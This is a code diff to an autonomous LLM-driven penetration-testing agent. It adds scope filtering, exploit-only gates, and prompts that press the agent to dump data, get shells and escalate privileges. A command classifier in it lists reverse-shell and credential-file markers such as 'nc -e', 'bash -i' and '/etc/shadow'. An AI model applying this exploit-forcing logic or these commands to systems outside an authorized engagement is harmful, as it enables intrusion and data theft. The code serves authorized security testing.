+                            line_ips = set(_mem_re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', line))
+                            # If line mentions IPs not in our scope, skip it
+                            if line_ips:
+                                out_of_scope = line_ips - allowed_set - {target.split(':')[0]}
+                                if out_of_scope:
+                                    self._log(f"Memory filtered (out-of-scope IPs {out_of_scope}): {line[:100]}", "DEBUG")
+                                    continue
+                            filtered_lines.append(line)
+                        memory_context = '\n'.join(filtered_lines)
+                    # Also strip job-specific artifact paths / runnable command blocks from memory.
+                    # Otherwise, the agent will waste iterations trying to `cat /pentest/output/<old_job_id>/...`.
+                    try:
+                        import re as _mem_s
+                        # Drop fenced code blocks entirely.
+                        memory_context = _mem_s.sub(r"```.*?```", "", memory_context, flags=_mem_s.S)
+                        cleaned = []
+                        for ln in (memory_context or "").splitlines():
+                            lns = ln.strip()
+                            if not lns:
+                                continue
+                            if "/pentest/output/" in lns:
+                                continue
+                            if lns.startswith("cat /pentest/output/"):
+                                continue
+                            cleaned.append(ln)
+                        memory_context = "\n".join(cleaned).strip()[:1200]
+                    except Exception:
+                        pass
+                    if memory_context.strip():
+                        initial_prompt += f"\n{memory_context}\n\n"
             
             initial_prompt += """
 **AVAILABLE TOOLS**:
@@ -3560,6 +5185,7 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
         
         while self.iteration < self.max_iterations:
             self.iteration += 1
+            self._gate_message_count_in_context = 0  # Reset gate message counter each iteration
             self._log(f"=== Iteration {self.iteration}/{self.max_iterations} ===")
             if self.hard_stop_reason:
                 self._log(f"Hard stop engaged: {self.hard_stop_reason}", "ERROR")
@@ -3567,58 +5193,177 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
 
             # Refresh all_vulns_resolved state: if ALL tracked vulns are proven or skipped, allow recon.
             try:
-                if self.vulns_found and not self.all_vulns_resolved:
+                # During post-proof deepening hold, NEVER "fail open" back into recon.
+                # Otherwise the runtime prompt says "0 unexploited vulns → recon allowed" while
+                # the hold blocks scanning/pivots, creating a wasteful blocked-loop.
+                if self._post_proof_hold_active():
+                    self.all_vulns_resolved = False
+                    self.force_exploit_next = True
+                    # Keep the LLM focused on the vuln that triggered the hold.
+                    if self.post_proof_hold_vuln_id:
+                        self.current_vuln_focus_id = self.post_proof_hold_vuln_id
+                    # Log only once per hold activation to reduce noise.
+                    if self.iteration == int(self.post_proof_hold_start_iteration or 0) + 1:
+                        self._log(
+                            f"POST-PROOF HOLD ACTIVE: delaying recon switch until impact deepened "
+                            f"(vuln={self.post_proof_hold_vuln_id}, target={self.post_proof_hold_target})",
+                            "INFO",
+                        )
+                elif self.vulns_found and not self.all_vulns_resolved:
                     _unresolved = [
                         v for v in self.vulns_found.values()
                         if isinstance(v, dict) and not v.get("exploited") and not (v.get("not_exploitable_reason") or "").strip()
                     ]
                     if not _unresolved:
-                        self.all_vulns_resolved = True
-                        self.force_exploit_next = False
-                        self.exploit_only_hard = False
-                        self.current_vuln_focus_id = None
-                        self._log("ALL VULNS RESOLVED (periodic check): switching to recon mode", "INFO")
+                        proven_count = sum(
+                            1 for v in self.vulns_found.values()
+                            if isinstance(v, dict) and (v.get("exploited") or v.get("proof"))
+                        )
+                        if proven_count > 0:
+                            self.all_vulns_resolved = True
+                            self.force_exploit_next = False
+                            self.exploit_only_hard = False
+                            self.current_vuln_focus_id = None
+                            self._log(
+                                "ALL VULNS RESOLVED (periodic check): allowing targeted recon/vuln discovery",
+                                "INFO",
+                            )
+                        else:
+                            # Do not treat "all skipped" as done when nothing is proven.
+                            self.all_vulns_resolved = False
+                            self.force_exploit_next = True
+                            self.exploit_only_hard = True
+                            self._log("NO-PROOF GUARD: unresolved=0 but proven=0, keeping exploit mode active", "WARN")
             except Exception:
                 pass
 
             # AUTO-COMPLETION: If all vulns resolved and no new findings for N iterations, stop.
+            # FIX: Require minimum iterations before auto-completing, and raise idle threshold.
             try:
-                auto_complete_after = int(os.getenv("AUTO_COMPLETE_IDLE_ITERATIONS", "20"))
+                # For long autonomous runs (e.g. 24h / 5000 iters), auto-complete is usually undesirable
+                # because it will stop early after the agent goes idle. Keep the behavior configurable
+                # via env var, but default-disable auto-complete when max_iterations is very high.
+                _auto_complete_env = os.getenv("AUTO_COMPLETE_IDLE_ITERATIONS")
+                if _auto_complete_env is None:
+                    auto_complete_after = 0 if int(getattr(self, "max_iterations", 0) or 0) >= 2000 else 50  # Was 20, raised to 50
+                else:
+                    try:
+                        auto_complete_after = int(_auto_complete_env)
+                    except Exception:
+                        auto_complete_after = 50
+                # Default lowered to reduce wasted cost once proof exists (override with env).
+                min_iterations_before_complete = int(os.getenv("AUTO_COMPLETE_MIN_ITERATIONS", "50"))
+                if getattr(self, "max_iterations", 0):
+                    min_iterations_before_complete = min(min_iterations_before_complete, int(self.max_iterations))
                 if self.all_vulns_resolved and self.vulns_found and auto_complete_after > 0:
-                    iters_since_last_proof = self.iteration - (self.last_proof_iteration or 0)
-                    # Also check for any new vuln discovery (not just proofs)
-                    last_vuln_iter = max(
-                        (int(v.get("iteration_found") or 0) for v in self.vulns_found.values() if isinstance(v, dict)),
-                        default=0
+                    # Don't auto-complete too early — agent needs time to explore
+                    if self.iteration < min_iterations_before_complete:
+                        # Reset all_vulns_resolved so agent continues exploring
+                        self.all_vulns_resolved = False
+                        # Don't log every iteration, just when first hitting this
+                        if self.iteration == min_iterations_before_complete - 1:
+                            self._log(
+                                f"AUTO-COMPLETE DEFERRED: only {self.iteration} iterations "
+                                f"(minimum {min_iterations_before_complete}). Continuing exploration.",
+                                "INFO"
+                            )
+                    else:
+                        iters_since_last_proof = self.iteration - (self.last_proof_iteration or 0)
+                        # Also check for any new vuln discovery (not just proofs)
+                        last_vuln_iter = max(
+                            (int(v.get("iteration_found") or 0) for v in self.vulns_found.values() if isinstance(v, dict)),
+                            default=0
+                        )
+                        iters_since_activity = self.iteration - max(self.last_proof_iteration or 0, last_vuln_iter)
+                        # Fix #6: Factor in supervisor hint count and blocked attempts for early termination
+                        effective_threshold = auto_complete_after
+                        if self.supervisor_hint_count >= 3:
+                            effective_threshold = min(effective_threshold, 25)  # Was 10
+                        if self.blocked_attempt_count >= 5:
+                            effective_threshold = min(effective_threshold, 35)  # Was 15
+                        if iters_since_activity >= effective_threshold:
+                            total_proven = sum(1 for v in self.vulns_found.values() if isinstance(v, dict) and v.get("proof"))
+                            total_vulns = len(self.vulns_found)
+
+                            # ── P1 Feature 2: Structured Completion Gate ──
+                            # Before allowing auto-complete, check if ANY vuln was truly exploited.
+                            # Block auto-complete if no vulns exploited (safety valve after 3 blocks).
+                            if total_proven == 0 and self.auto_complete_blocks < 3:
+                                self.auto_complete_blocks += 1
+                                block_msg = (
+                                    "⚠️ AUTO-COMPLETE BLOCKED: No vulnerabilities have been truly exploited yet.\n"
+                                    f"You found {total_vulns} vulnerabilities but didn't extract real data. Before completing:\n"
+                                    "1. Pick your best finding and EXPLOIT it fully (dump data, get shell, read files)\n"
+                                    "2. If all attempts failed, document WHY with evidence\n"
+                                    f"Do NOT complete until you have at least ONE real exploitation with data proof. "
+                                    f"(Block {self.auto_complete_blocks}/3)"
+                                )
+                                self.conversation.append({"role": "user", "content": block_msg})
+                                self.all_vulns_resolved = False
+                                self.force_exploit_next = True
+                                self._log(
+                                    f"AUTO-COMPLETE BLOCKED ({self.auto_complete_blocks}/3): "
+                                    f"0/{total_vulns} vulns exploited, pushing agent to exploit",
+                                    "WARN"
+                                )
+                                # Don't break — continue the loop
+                            else:
+                                self._log(
+                                    f"AUTO-COMPLETE: {total_proven}/{total_vulns} vulns proven, "
+                                    f"{iters_since_activity} idle iterations (threshold={effective_threshold}, "
+                                    f"hints={self.supervisor_hint_count}, blocks={self.blocked_attempt_count}). Stopping.",
+                                    "INFO"
+                                )
+                                self.hard_stop_reason = (
+                                    f"Auto-completed: {total_proven}/{total_vulns} vulns proven. "
+                                    f"No new findings for {iters_since_activity} iterations."
+                                )
+                                break
+            except Exception:
+                pass
+
+            # ── P1 Feature 6: Self-Check Injection (every N iterations) ──
+            try:
+                if self.self_check_interval > 0 and self.iteration > 0 and self.iteration % self.self_check_interval == 0:
+                    proven_count = sum(1 for v in self.vulns_found.values() if isinstance(v, dict) and v.get("exploited"))
+                    total_count = len(self.vulns_found)
+                    no_exploit_warning = (
+                        "⚠️ NO VULNS EXPLOITED YET — CHANGE STRATEGY IMMEDIATELY."
+                        if proven_count == 0
+                        else "✅ Good progress. Push deeper — dump more data, escalate privileges."
                     )
-                    iters_since_activity = self.iteration - max(self.last_proof_iteration or 0, last_vuln_iter)
-                    # Fix #6: Factor in supervisor hint count and blocked attempts for early termination
-                    effective_threshold = auto_complete_after
-                    if self.supervisor_hint_count >= 3:
-                        effective_threshold = min(effective_threshold, 10)
-                    if self.blocked_attempt_count >= 5:
-                        effective_threshold = min(effective_threshold, 15)
-                    if iters_since_activity >= effective_threshold:
-                        total_proven = sum(1 for v in self.vulns_found.values() if isinstance(v, dict) and v.get("proof"))
-                        total_vulns = len(self.vulns_found)
-                        self._log(
-                            f"AUTO-COMPLETE: {total_proven}/{total_vulns} vulns proven, "
-                            f"{iters_since_activity} idle iterations (threshold={effective_threshold}, "
-                            f"hints={self.supervisor_hint_count}, blocks={self.blocked_attempt_count}). Stopping.",
-                            "INFO"
-                        )
-                        self.hard_stop_reason = (
-                            f"Auto-completed: {total_proven}/{total_vulns} vulns proven. "
-                            f"No new findings for {iters_since_activity} iterations."
-                        )
-                        break
+                    check_msg = (
+                        f"🔍 SELF-CHECK — Iteration {self.iteration}:\n"
+                        f"Vulns found: {total_count} | Exploited: {proven_count}\n\n"
+                        "EVALUATE NOW:\n"
+                        "1. Have I ACTUALLY exploited any vulnerability with real data extraction?\n"
+                        "2. Am I repeating failed approaches instead of trying new ones?\n"
+                        "3. Have I used discovered credentials to access other services?\n"
+                        "4. Did I try manual exploitation when automated tools failed?\n\n"
+                        f"{no_exploit_warning}"
+                    )
+                    self.conversation.append({"role": "user", "content": check_msg})
+                    self._log(
+                        f"Self-check injected at iteration {self.iteration}: {proven_count}/{total_count} exploited",
+                        "INFO"
+                    )
+                    # Auto-FP: check for vulns stuck in exploit loops
+                    for vid, vrec in self.vulns_found.items():
+                        if isinstance(vrec, dict) and not vrec.get("exploited") and not (vrec.get("not_exploitable_reason") or "").strip():
+                            ac = vrec.get("attempt_count", 0)
+                            if ac >= self.exploit_proof_max_attempts_per_vuln * 2:
+                                vrec["not_exploitable_reason"] = (
+                                    f"Self-check auto-FP: {ac} attempts without proof at iteration {self.iteration}."
+                                )
+                                self._log(f"SELF-CHECK AUTO-FP: {vid} marked not-exploitable ({ac} attempts, 0 proof)", "WARN")
+                    self._save_vulns()
             except Exception:
                 pass
 
             # Context pack: keep long runs bounded without forgetting (Spec 008: summarize-before-trim)
             try:
-                max_messages = int(os.getenv("MAX_CONTEXT_MESSAGES", "40"))
-                max_context_chars = int(os.getenv("MAX_CONTEXT_CHARS", "14000"))
+                max_messages = int(os.getenv("MAX_CONTEXT_MESSAGES", "60"))
+                max_context_chars = int(os.getenv("MAX_CONTEXT_CHARS", "30000"))
                 if len(self.conversation) > max_messages:
                     system_msg = self.conversation[0] if self.conversation and self.conversation[0]["role"] == "system" else None
                     recent = self.conversation[-14:]
@@ -3638,6 +5383,11 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
                     trimmed = []
                     if system_msg:
                         trimmed.append(system_msg)
+
+                    # P1: Structured state snapshot survives trimming.
+                    structured_summary = self._build_structured_context_summary()
+                    if structured_summary:
+                        trimmed.append({"role": "user", "content": structured_summary})
 
                     # Spec 008: Inject accumulated digest as first message after system prompt
                     if self.context_digest:
@@ -3669,6 +5419,35 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
                             context_keywords=[target.split(':')[0], 'credential', 'vulnerability', 'tool']
                         )
                         if memory_context:
+                            # Apply same sanitization used at run start.
+                            try:
+                                allowed_set = self.allowed_targets_set or set(self.allowed_targets)
+                                if allowed_set:
+                                    filtered_lines = []
+                                    import re as _mem_re
+                                    for line in memory_context.split('\n'):
+                                        line_ips = set(_mem_re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', line))
+                                        if line_ips:
+                                            out_of_scope = line_ips - allowed_set - {target.split(':')[0]}
+                                            if out_of_scope:
+                                                continue
+                                        filtered_lines.append(line)
+                                    memory_context = '\n'.join(filtered_lines)
+                                import re as _mem_s
+                                memory_context = _mem_s.sub(r"```.*?```", "", memory_context, flags=_mem_s.S)
+                                cleaned = []
+                                for ln in (memory_context or "").splitlines():
+                                    lns = ln.strip()
+                                    if not lns:
+                                        continue
+                                    if "/pentest/output/" in lns:
+                                        continue
+                                    if lns.startswith("cat /pentest/output/"):
+                                        continue
+                                    cleaned.append(ln)
+                                memory_context = "\n".join(cleaned).strip()[:1200]
+                            except Exception:
+                                pass
                             trimmed.append({"role": "user", "content": f"**CONTEXT PACK (auto)**\n{memory_context}"})
 
                     trimmed.extend(recent)
@@ -3679,7 +5458,7 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
                 total_chars = sum(len(m.get("content", "")) for m in self.conversation)
                 if total_chars > max_context_chars:
                     # Batch-identify droppable indices, then remove in one pass (O(n) not O(n²)).
-                    _PRESERVE_MARKERS = ("ACCUMULATED INTELLIGENCE", "OBTAINED ARTIFACTS", "EVIDENCE FILES")
+                    _PRESERVE_MARKERS = ("STRUCTURED CONTEXT SUMMARY", "ACCUMULATED INTELLIGENCE", "OBTAINED ARTIFACTS", "EVIDENCE FILES")
                     drop_indices = []
                     for _ci in range(1, len(self.conversation) - 4):
                         _mc = self.conversation[_ci].get("content", "")
@@ -3746,6 +5525,18 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
                             self.conversation.append({"role": "user", "content": push_msg})
             except Exception:
                 pass
+
+            # P0: Phase gate + persistent findings context enforced before every LLM call.
+            try:
+                self._sync_structured_findings_from_vuln_tracker()
+                self._save_structured_findings()
+                phase_gate_msg = self._enforce_phase_gate_before_llm()
+                if phase_gate_msg:
+                    self.conversation.append({"role": "user", "content": phase_gate_msg})
+                self._inject_playbook_autofire()
+                self._inject_runtime_enforcement_context()
+            except Exception:
+                pass
             
             # Get AI response
             try:
@@ -3785,6 +5576,9 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
                             continue
                 if last_err is not None:
                     raise last_err
+
+                # Ensure we always treat the response as plain text (SDKs may return blocks).
+                response = self._normalize_llm_response_text(response)
                 
                 self.conversation.append({"role": "assistant", "content": response})
                 self._log(f"AI response: {len(response)} chars")
@@ -3792,6 +5586,21 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
                 # Extract memories from AI response (AI decides what to remember)
                 self._extract_memories(response)
                 self._update_mitre_hits(response)
+
+                # P0: Anti-loop prompting: reject scan-loop language and force exploitation.
+                response_lower = (response or "").lower()
+                if any(phrase in response_lower for phrase in self.banned_loop_phrases):
+                    self.conversation.append(
+                        {
+                            "role": "user",
+                            "content": (
+                                "⛔ REJECTED LOOPING LANGUAGE. Do not say 'let me scan more' or 'given the complexity'. "
+                                "After finding vulnerabilities, your next action MUST be exploitation."
+                            ),
+                        }
+                    )
+                    self.force_exploit_next = True
+                    continue
                 
                 # Auto-save session every 5 iterations
                 if self.iteration % 5 == 0:
@@ -3839,6 +5648,21 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
                             f"EXPLOIT-ONLY GATE: blocked non-exploit command (intent={intent})",
                             "WARN",
                         )
+                        # Increment attempt count on gate blocks so fail-fast can detect false positives
+                        if self.current_vuln_focus_id:
+                            vrec = self.vulns_found.get(self.current_vuln_focus_id)
+                            if isinstance(vrec, dict):
+                                vrec["attempt_count"] = vrec.get("attempt_count", 0) + 1
+                                _ac = vrec.get("attempt_count", 0)
+                                if _ac >= self.exploit_proof_max_attempts_per_vuln * 3:
+                                    if not vrec.get("exploited") and not (vrec.get("not_exploitable_reason") or "").strip():
+                                        vrec["not_exploitable_reason"] = (
+                                            f"Auto-marked as likely false positive: {_ac} exploit gate blocks "
+                                            f"without successful exploitation. Original evidence may have been from "
+                                            f"agent's own environment, not the target."
+                                        )
+                                        self._log(f"AUTO-FP: {self.current_vuln_focus_id} marked as false positive after {_ac} gate blocks", "WARN")
+                                        self._save_vulns()
                         # Build enriched gate message with vuln context and templates
                         gate_msg = "❌ POLICY: EXPLOIT-ONLY mode is active.\n\n"
                         focus_vid = self.current_vuln_focus_id
@@ -3873,7 +5697,23 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
                                     gate_msg += f"\n{a_section}"
                         except Exception:
                             pass
-                        self.conversation.append({"role": "user", "content": gate_msg})
+                        # Cap exploit-only gate messages to prevent infinite loops
+                        self._gate_message_count_in_context += 1
+                        if self._gate_message_count_in_context <= self.max_gate_messages_in_context:
+                            self.conversation.append({"role": "user", "content": gate_msg})
+                        else:
+                            self._log(
+                                f"EXPLOIT-ONLY GATE MSG CAP: {self._gate_message_count_in_context}/{self.max_gate_messages_in_context} — "
+                                f"force-advancing to break loop",
+                                "WARN",
+                            )
+                            self._gate_message_count_in_context = 0
+                            self._reset_conversation(
+                                "Exploit-only gate loop detected. Resetting context. "
+                                "Provide ONE concrete exploit command.",
+                                {"action": "reset"},
+                            )
+                            break
                         continue
                 except Exception:
                     pass
@@ -3894,6 +5734,21 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
                             f"EXPLOIT GATE: blocked non-exploit command (intent={intent}) reprompt={self.force_exploit_reprompts}",
                             "WARN",
                         )
+                        # Increment attempt count on gate blocks so fail-fast can detect false positives
+                        if self.current_vuln_focus_id:
+                            vrec = self.vulns_found.get(self.current_vuln_focus_id)
+                            if isinstance(vrec, dict):
+                                vrec["attempt_count"] = vrec.get("attempt_count", 0) + 1
+                                _ac = vrec.get("attempt_count", 0)
+                                if _ac >= self.exploit_proof_max_attempts_per_vuln * 3:
+                                    if not vrec.get("exploited") and not (vrec.get("not_exploitable_reason") or "").strip():
+                                        vrec["not_exploitable_reason"] = (
+                                            f"Auto-marked as likely false positive: {_ac} exploit gate blocks "
+                                            f"without successful exploitation. Original evidence may have been from "
+                                            f"agent's own environment, not the target."
+                                        )
+                                        self._log(f"AUTO-FP: {self.current_vuln_focus_id} marked as false positive after {_ac} gate blocks", "WARN")
+                                        self._save_vulns()
                         
                         # ── Gate message verbosity control ──
                         if self.gate_message_verbosity == "none":
@@ -3957,8 +5812,24 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
                         if self._gate_message_count_in_context <= self.max_gate_messages_in_context:
                             self.conversation.append({"role": "user", "content": reprompt})
                         else:
-                            # Over cap — replace the oldest gate message instead of adding
-                            self._log(f"GATE MSG CAP: {self._gate_message_count_in_context}/{self.max_gate_messages_in_context}, skipping append", "INFO")
+                            # Over cap — force-advance the iteration to break the reprompt loop.
+                            # The old behavior (skip append + continue) caused infinite loops where
+                            # the model kept producing non-exploit commands but the gate kept blocking
+                            # without advancing the iteration counter.
+                            self._log(
+                                f"GATE MSG CAP: {self._gate_message_count_in_context}/{self.max_gate_messages_in_context} — "
+                                f"force-advancing iteration to break reprompt loop",
+                                "WARN",
+                            )
+                            self._gate_message_count_in_context = 0  # Reset for next cycle
+                            self.force_exploit_reprompts = 0
+                            # Reset conversation to break the loop pattern
+                            self._reset_conversation(
+                                f"Exploit gate reprompt loop detected ({self._gate_message_count_in_context} gate messages). "
+                                "Resetting context. Provide ONE concrete exploit command.",
+                                {"action": "reset"},
+                            )
+                            break  # Force iteration to advance
                         # In strict proof mode, do not fail-open. Keep forcing exploitation and occasionally reset context.
                         if self.enforce_exploit_proof:
                             if self.force_exploit_reprompts >= self.exploit_gate_hard_reset_after:
@@ -3968,6 +5839,7 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
                                     {"action": "reset"},
                                 )
                                 self.force_exploit_reprompts = 0
+                                self._gate_message_count_in_context = 0  # Reset gate counter after hard reset
                             continue
                         if self.force_exploit_reprompts <= self.force_exploit_max_reprompts:
                             continue
@@ -4191,6 +6063,30 @@ Continue the assessment - provide the next commands."""
                     all_feedback.append(wordlist_warning)
                     continue
 
+                # P1: Reject scan actions while unexploited findings exist.
+                if self._is_scan_like_command(content) and self._get_unexploited_findings():
+                    reject_msg = "⛔ REJECTED: Exploit your findings first."
+                    self._log(f"REJECTED scan-with-unexploited-findings: {content[:80]}", "WARN")
+                    all_feedback.append(reject_msg)
+                    self.force_exploit_next = True
+                    continue
+
+                # Post-proof deepening hold: after exploitation proof, block scans/pivots until
+                # we extract additional impact from the same target.
+                hold_warning = self._post_proof_hold_violation(content)
+                if hold_warning:
+                    self._log(f"POST-PROOF HOLD blocked command: {content[:80]}", "WARN")
+                    all_feedback.append(hold_warning)
+                    self.force_exploit_next = True
+                    continue
+
+                # Hard scan blocking — prevent nmap/masscan/nikto loops
+                scan_block_warning = self._hard_block_scan(content)
+                if scan_block_warning:
+                    self._log(f"HARD BLOCKED scan command: {content[:80]}", "WARN")
+                    all_feedback.append(scan_block_warning)
+                    continue
+
                 # Target scoping check — block off-target commands
                 off_target_warning = self._is_off_target(content)
                 if off_target_warning:
@@ -4288,6 +6184,43 @@ Continue the assessment - provide the next commands."""
 
                 # Auto-extract learnings from execution
                 self._auto_extract_learnings(execution)
+
+                # Post-proof deepening hold: count follow-up impact actions after proof
+                try:
+                    self._note_post_proof_hold_execution(execution)
+                except Exception:
+                    pass
+
+                # ── P1 Feature 3: Repeating Command Detector ──
+                try:
+                    if self.repeating_detector.check(execution.content or ""):
+                        normalized = self.repeating_detector._normalize(execution.content or "")
+                        self._log(f"REPEATING COMMAND DETECTED: {normalized[:100]}", "WARN")
+                        repeat_msg = (
+                            "🔄 REPEATING COMMAND DETECTED — You've run the same command 3+ times.\n"
+                            "This approach is NOT working. You MUST:\n"
+                            "1. Try a COMPLETELY different tool or technique\n"
+                            "2. If using sqlmap, try manual injection with curl\n"
+                            "3. If using nmap, try masscan or direct service probing\n"
+                            "4. If brute-forcing, try credential reuse or default creds instead\n"
+                            "DO NOT run this command again."
+                        )
+                        all_feedback.append(repeat_msg)
+                except Exception:
+                    pass
+
+                # ── P1 Feature 7: Exploitation Evidence Pattern Matching ──
+                try:
+                    combined_output = ((execution.stdout or "") + "\n" + (execution.stderr or "")).strip()
+                    evidence = self._detect_exploitation_evidence(combined_output, execution.content or "")
+                    if evidence:
+                        self._log(f"🎯 EXPLOITATION EVIDENCE DETECTED: {', '.join(evidence)}", "INFO")
+                        if self.current_vuln_focus_id:
+                            vrec = self.vulns_found.get(self.current_vuln_focus_id)
+                            if isinstance(vrec, dict):
+                                vrec.setdefault("evidence_types", []).extend(evidence)
+                except Exception:
+                    pass
                 
                 self._log(f"  {execution.tool_used}: exit={execution.exit_code}")
                 all_feedback.append(self._build_feedback(execution))
@@ -4329,27 +6262,70 @@ Continue the assessment - provide the next commands."""
         return False
 
     def _sanitize_sqlmap_command(self, cmd: str) -> str:
-        """Ensure sqlmap commands always run with --batch and sane defaults."""
-        if not cmd or not cmd.strip().startswith("sqlmap"):
+        """Ensure sqlmap commands always run with --batch and sane defaults.
+
+        NOTE: LLMs often append output-limit pipes like `| head -50` / `| tail -40`.
+        If we blindly append flags to the end of the string, we can end up with:
+          `sqlmap ... | tail -40 --timeout=120`
+        which breaks the pipeline and makes the attempt fail (tail sees `--timeout`).
+        We split off any shell suffix (`|`, `&&`, `||`, `;`, newline) and only
+        append flags to the sqlmap invocation prefix.
+        """
+        raw = (cmd or "").strip()
+        if not raw.startswith("sqlmap"):
             return cmd
+
+        def _split_shell_suffix(s: str) -> Tuple[str, str]:
+            in_sq = False
+            in_dq = False
+            escape = False
+            for i, ch in enumerate(s):
+                if escape:
+                    escape = False
+                    continue
+                if ch == "\\" and not in_sq:
+                    escape = True
+                    continue
+                if ch == "'" and not in_dq:
+                    in_sq = not in_sq
+                    continue
+                if ch == '"' and not in_sq:
+                    in_dq = not in_dq
+                    continue
+                if in_sq or in_dq:
+                    continue
+                # Outside quotes: split at first shell operator / newline.
+                if s.startswith("&&", i) or s.startswith("||", i):
+                    return s[:i].rstrip(), s[i:].lstrip()
+                if ch in ("|", ";", "\n"):
+                    return s[:i].rstrip(), s[i:].lstrip()
+            return s, ""
+
+        prefix, suffix = _split_shell_suffix(raw)
+
         added_flags = []
-        if "--batch" not in cmd:
-            cmd = cmd.strip() + " --batch"
+        if "--batch" not in prefix:
+            prefix = prefix + " --batch"
             added_flags.append("--batch")
-        if "--timeout" not in cmd:
-            cmd = cmd.strip() + " --timeout=120"
+        # Avoid false matches on other flags that contain "--timeout" in suffix.
+        if re.search(r"(^|\\s)--timeout(\\s|=)", prefix) is None:
+            prefix = prefix + " --timeout=120"
             added_flags.append("--timeout=120")
-        if "--level" not in cmd and "--risk" not in cmd:
-            cmd = cmd.strip() + " --level 2 --risk 2"
+        if "--level" not in prefix and "--risk" not in prefix:
+            prefix = prefix + " --level 2 --risk 2"
             added_flags.append("--level 2 --risk 2")
-        if "--output-dir" not in cmd:
+        if "--output-dir" not in prefix:
             job_id = os.environ.get("JOB_ID") or self.session_id or "default"
             output_dir = f"/pentest/output/{job_id}/sqlmap/"
-            cmd = cmd.strip() + f" --output-dir={output_dir}"
+            prefix = prefix + f" --output-dir={output_dir}"
             added_flags.append(f"--output-dir={output_dir}")
+
+        sanitized = prefix
+        if suffix:
+            sanitized = sanitized.rstrip() + " " + suffix.lstrip()
         if added_flags:
             self._log(f"SQLMAP SANITIZED: added {', '.join(added_flags)}", "INFO")
-        return cmd
+        return sanitized
 
     def _get_exploit_templates_for_vuln(self, vuln_type: str, target: str) -> list:
         """Return concrete bash command templates for a given vulnerability type."""
@@ -4463,8 +6439,20 @@ Continue the assessment - provide the next commands."""
         if not cmd_lower:
             return "other"
 
+        # Research tooling: searchsploit is not an exploit attempt (prevents exploit-gate bypass loops).
+        if "searchsploit" in cmd_lower:
+            return "enum"
+
+        # Metasploit can be enumeration (search) or exploitation (use+run).
+        if "msfconsole" in cmd_lower:
+            if "search " in cmd_lower and "use " not in cmd_lower:
+                return "enum"
+            if "use " in cmd_lower or " run" in cmd_lower or " exploit" in cmd_lower:
+                return "exploit"
+            return "other"
+
         exploit_keywords = [
-            "sqlmap", "commix", "msfconsole", "msfvenom", "searchsploit", "metasploit",
+            "sqlmap", "commix", "msfconsole", "msfvenom", "metasploit",
             "hydra", "medusa", "patator", "john", "hashcat", "crackmapexec",
             "reverse shell", "shell.php", "webshell", "nc -e", "bash -i",
             "pg_dump", "mysqldump", "select * from", "union select",
@@ -4495,7 +6483,14 @@ Continue the assessment - provide the next commands."""
                 "--data", " -d ", "--data-raw", "--data-binary", " -f ", " -F ",
                 "-x post", "-x put", "-x delete",
             ]
-            disclosure_exts = (".bak", ".old", ".backup", ".zip", ".tar", ".tgz", ".gz", ".7z", ".sql", ".db", ".sqlite", ".env")
+            disclosure_exts = (
+                ".bak", ".old", ".backup", ".zip", ".tar", ".tgz", ".gz", ".7z",
+                ".sql", ".db", ".sqlite", ".env",
+                # Common config/secret formats
+                ".yml", ".yaml", ".json", ".conf", ".ini", ".properties", ".log",
+                # Common key/credential bundles
+                ".kdbx", ".pem", ".key",
+            )
             auth_markers = [
                 "authorization:", "bearer ", "x-access-token", "x-auth-token",
                 "cookie:", "token=", "jwt", "eyj",
@@ -4504,13 +6499,14 @@ Continue the assessment - provide the next commands."""
                 return "exploit" if (not self.focus_vuln_keywords or self._command_matches_focus(cmd_lower)) else "enum"
             # Accessing exposed files is an exploit (information disclosure), not mere enumeration.
             if "/ftp/" in cmd_lower:
-                disclosure_focus = any("disclosure" in k for k in (self.focus_vuln_keywords or []))
-                if disclosure_focus or any(ext in cmd_lower for ext in disclosure_exts):
+                # If this is a concrete file fetch under /ftp/, treat as exploitation attempt
+                # (directory listing alone is still enumeration).
+                import re as _re_ftp
+                if _re_ftp.search(r"/ftp/[^\s\"']+", cmd_lower):
                     return "exploit" if (not self.focus_vuln_keywords or self._command_matches_focus(cmd_lower)) else "enum"
             if "../" in cmd_lower:
-                disclosure_focus = any("disclosure" in k for k in (self.focus_vuln_keywords or []))
-                if disclosure_focus:
-                    return "exploit" if (not self.focus_vuln_keywords or self._command_matches_focus(cmd_lower)) else "enum"
+                # Traversal probes are exploitation attempts by definition.
+                return "exploit" if (not self.focus_vuln_keywords or self._command_matches_focus(cmd_lower)) else "enum"
             # Command injection markers (encoded or literal) with a proof-like probe.
             if any(m in cmd_lower for m in cmdi_markers) and any(p in cmd_lower for p in cmdi_probes):
                 return "exploit" if (not self.focus_vuln_keywords or self._command_matches_focus(cmd_lower)) else "enum"
@@ -4521,6 +6517,54 @@ Continue the assessment - provide the next commands."""
             if any(m in cmd_lower for m in injection_markers + exploit_markers):
                 return "exploit" if (not self.focus_vuln_keywords or self._command_matches_focus(cmd_lower)) else "enum"
             
+            # ── Expanded curl-as-exploit classification (Fix: broken classifier) ──
+            # curl with cookies (-b) or Authorization headers → exploit
+            if " -b " in cmd_lower or "-b " in cmd_lower.split("curl", 1)[-1]:
+                return "exploit"
+            if any(h in cmd_lower for h in ('authorization:', '"authorization', "'authorization", "bearer ", '"bearer', "'bearer")):
+                return "exploit"
+
+            # curl reading sensitive files → exploit (data exfil)
+            sensitive_files = ("/etc/passwd", "/etc/shadow", ".env", "wp-config", "config.php",
+                               "database.yml", "settings.py", "application.properties", ".htpasswd",
+                               "/proc/self", "shadow", "id_rsa", "authorized_keys")
+            if any(sf in cmd_lower for sf in sensitive_files):
+                return "exploit"
+
+            # curl POST/PUT with data payload → exploit (unless health/status endpoint)
+            health_endpoints = ("/health", "/status", "/ping", "/ready", "/alive", "/version", "/info")
+            if any(m in cmd_lower for m in ("-x post", "-x put")) and any(m in cmd_lower for m in ("--data", " -d ", "--data-raw", "--data-binary")):
